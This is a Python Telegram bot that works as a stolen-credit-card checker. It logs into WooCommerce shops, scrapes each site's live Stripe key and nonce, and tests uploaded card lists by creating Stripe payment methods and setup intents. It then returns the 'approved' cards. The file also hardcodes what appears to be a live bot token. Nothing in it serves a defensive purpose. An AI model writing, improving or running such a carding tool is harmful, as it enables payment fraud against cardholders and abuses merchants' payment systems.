import requests
import re
import threading
import logging
import json
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from io import BytesIO

BOT_TOKEN = "7248159727:AAEzc2CNStU6H8F3zD4Y5CFIYRSkyhO_TiQ"

logging.basicConfig(level=logging.INFO)
user_data = {}
lock = threading.Lock()


def get_headers():
    return {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "accept": "text/html,application/xhtml+xml",
        "accept-language": "en-US,en;q=0.9",
    }


def detect_stripe_type(html):
    if "setup_intent" in html:
        return "setup_intent"
    elif "payment_method" in html:
        return "payment_method"
    elif "source" in html:
        return "source"
    elif "token" in html:
        return "token"
    return "unknown"


def extract_pk(html):
    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
    return match.group(0) if match else None


def try_login(site, email, password, session):
    login_url = f"https://{site}/my-account/"
    r = session.get(login_url, headers=get_headers())
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
    referer = soup.find("input", {"name": "_wp_http_referer"})

    if not nonce:
        return False, "Login page error."

    payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce["value"],
        '_wp_http_referer': referer["value"] if referer else "/my-account/",
        'login': 'Log in'
    }

    r = session.post(login_url, data=payload, headers=get_headers())
    return ("customer-logout" in r.text), r.text


async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args or len(args) < 1 or '|' not in args[0]:
        await update.message.reply_text("Usage: /addsitelogin site|email|password")
        return

    site, email, password = args[0].split("|")
    session = requests.Session()

    success, resp_html = try_login(site, email, password, session)
    if not success:
        await update.message.reply_text("Login failed.")
        return

    with lock:
        user_data[user_id] = {
            "site": site,
            "email": email,
            "password": password,
            "session": session,
        }

    await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")


async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please login first using /addsitelogin")
        return

    url = update.message.text
    user_data[user_id]["check_url"] = url
    await update.message.reply_text("Payment Method URL saved. Now upload a .txt combo list.")


def parse_card(card):
    match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
    return match.groups() if match else None


def check_card(card, data):
    try:
        parsed = parse_card(card)
        if not parsed:
            return f"{card} -> Invalid format"
        cc, mm, yy, cvv = parsed
        if len(yy) == 2:
            yy = "20" + yy

        session = data["session"]
        site = data["site"]
        check_url = data["check_url"]

        # Re-fetch to get fresh pk and nonce
        r = session.get(check_url, headers=get_headers())
        html = r.text
        pk = extract_pk(html)
        stripe_type = detect_stripe_type(html)
        ajax_nonce = re.search(r'"ajax_nonce":"(\w+)"', html)
        ajax_nonce = ajax_nonce.group(1) if ajax_nonce else None

        if not pk or stripe_type != "setup_intent":
            return f"{card} -> Error: Unable to extract pk or setup_intent"

        # Step 1: create payment method with pk
        r = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers={"Authorization": f"Bearer {pk}"},
            data={
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv,
            }
        )
        stripe_resp = r.json()
        if 'error' in stripe_resp:
            return f"{card} -> Declined ❌\n{stripe_resp['error'].get('message', 'Unknown error')}"

        pm_id = stripe_resp['id']

        # Step 2: WooCommerce AJAX call
        payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }

        ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
        final = session.post(ajax_url, data=payload, headers={"X-Requested-With": "XMLHttpRequest"})
        json_resp = final.json()

        if json_resp.get("success"):
            return f"{card} -> Approved ✅"
        else:
            return f"{card} -> Declined ❌"

    except Exception as e:
        return f"{card} -> Error: {str(e)}"


async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please login and set the payment URL first.")
        return

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please upload a valid .txt file.")
        return

    file = await doc.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode().splitlines()

    results = []
    for card in lines:
        result = check_card(card.strip(), user_data[user_id])
        results.append(result)
        await update.message.reply_text(result)

    approved = [r for r in results if "Approved" in r]
    declined = [r for r in results if "Declined" in r]
    errors = [r for r in results if "Error" in r]

    summary = (
        f"**Check Complete**\n"
        f"Total: {len(lines)}\n"
        f"✅ Approved: {len(approved)}\n"
        f"❌ Declined: {len(declined)}\n"
        f"⚠️ Errors: {len(errors)}"
    )
    await update.message.reply_text(summary, parse_mode="Markdown")

    if approved:
        approved_file = BytesIO("\n".join(approved).encode())
        approved_file.name = "approved.txt"
        await update.message.reply_document(approved_file)


if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_url))
    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_txt))

    print("Bot is running...")
    app.run_polling()
